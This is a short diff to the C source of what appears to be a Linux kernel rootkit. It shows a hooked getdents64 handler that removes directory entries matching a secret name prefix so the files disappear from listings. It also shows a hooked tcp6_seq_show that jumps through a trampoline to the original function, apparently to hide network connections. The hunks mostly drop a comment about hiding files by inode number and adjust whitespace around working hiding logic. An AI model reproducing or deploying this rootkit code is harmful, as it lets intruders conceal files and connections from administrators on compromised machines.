@@ -44,12 +44,7 @@ params:
         next = (struct linux_dirent64*)(cur + offset); 
 
         if(strncmp(next->d_name, SECRET, SIZE_SECRET) == 0) 
-        {
-            /* a poc that shows how we might hide files with the same name but in different dirs, 
-             * since when were applying the hook it will mask everything that starts with our generic name. Thus, we can create a function which takes the inumber and compares it against our secert file, if it's equal we we hide it, if not we return the default state of the directory. *
-            here I just show how it might be working, since I can dump inumber with - ls -i.  
-            */ 
-             
+        {            
             // here we take the next entry & copy it to our current entry which we've found,
             memcpy(cur + offset, cur + offset + next->d_reclen, ret - (offset  + next->d_reclen)); 
             // redfine the return value little bit , so it returns with a differnt state. 
@@ -71,6 +66,7 @@ static int my_tcp6_seq_show(struct seq_file *file, void *v)
 
 // NOTE: I know this trampoline isn't looking that good, it could be solved by pushing both params to inline assembly snippet(rsi=file, rdi=v) and 
 // then save the return value by emitting the rax value to a varible and return it a follows : return tramp() instead what we have now. But it works pretty good... :v) 
+    
     tramp(); /* trampoline to the original function */ 
     return 1;
 }
